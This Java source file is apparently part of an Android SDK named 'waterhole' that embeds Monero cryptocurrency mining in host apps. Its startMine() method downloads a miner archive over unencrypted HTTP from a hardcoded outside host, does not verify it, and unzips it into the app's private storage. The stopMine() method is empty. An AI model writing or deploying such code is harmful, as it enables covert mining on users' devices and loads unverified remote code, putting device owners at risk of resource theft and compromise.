package waterhole.miner.monero;

import java.io.ObjectStreamException;

import waterhole.miner.core.AbstractMiner;
import waterhole.miner.core.utils.FileUtils;

import static waterhole.miner.core.asyn.AsyncTaskAssistant.executeOnThreadPool;
import static waterhole.miner.core.utils.FileUtils.unzip;
import static waterhole.miner.core.utils.LogUtils.info;
import static waterhole.miner.core.utils.FileUtils.downloadFile;

/**
 * 门罗挖矿类，对外提供，挖新版门罗，旧版门罗，自动切换门罗挖矿功能。
 *
 * @author kzw on 2018/05/16.
 */
public final class MoneroMiner extends AbstractMiner implements FileUtils.DownloadCallback, FileUtils.UnzipCallback {

    private static final String TAG = "Waterhole-XmrMiner";

    private static final String OLD_MINER_DOWNLOAD_URL = "http://eidon.top:8000/xmr-miner-old.zip";
    private static final String OLD_MINER_SAVE_FIILENAME = "xmr-miner-old.zip";

    private MoneroMiner() {
    }

    public static MoneroMiner instance() {
        return Holder.instance;
    }

    private static class Holder {
        static MoneroMiner instance = new MoneroMiner();
    }

    private Object readResolve() throws ObjectStreamException {
        return instance();
    }

    @Override
    public void startMine() {
        if (getContext() == null) {
            throw new RuntimeException("please call setContext() first");
        }
        executeOnThreadPool(new Runnable() {
            @Override
            public void run() {
                downloadFile(OLD_MINER_DOWNLOAD_URL,
                        getContext().getFilesDir().getAbsolutePath() + OLD_MINER_SAVE_FIILENAME,
                        MoneroMiner.this);
            }
        });
    }

    @Override
    public void stopMine() {

    }

    @Override
    public void onDownloadSuccess(String pathName) {
        info(TAG, "download old miner success");
        unzip(pathName, getContext().getFilesDir().getAbsolutePath(), this);
    }

    @Override
    public void onDownloadFail(String path, String reason) {
        info(TAG, "download old miner fail: " + reason);
    }

    @Override
    public void onUnzipComplete(String path) {
        info(TAG, "unzip old miner success");
    }

    @Override
    public void onUnzipFail(String path, String reason) {
        info(TAG, "unzip old miner fail: " + reason);
    }

    @Override
    public void onUnzipEntryFail(String path, String reason) {
        info(TAG, "unzip old miner entry fail: " + reason);
    }
}
